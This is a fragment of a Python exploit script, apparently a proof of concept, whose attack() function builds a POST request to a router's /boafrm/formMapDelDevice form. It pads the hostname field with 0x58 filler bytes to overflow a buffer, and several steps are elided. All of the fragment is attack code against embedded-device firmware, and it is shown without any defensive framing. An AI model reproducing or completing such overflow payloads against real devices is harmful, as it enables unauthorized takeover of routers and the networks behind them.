...
def attack():
    ...
    payload_body = f'sessionCheck={sessionId}&submit-url=&macstr=&bandstr=&hostname='.encode()
       
    payload_body += b'a'*0x58 # buf
    ...
    payload_body += b'&hostmac=&hostnameAdd=Apply'
    
    content_length = len(payload_body)
    
    payload = b"POST /boafrm/formMapDelDevice HTTP/1.1\r\n"
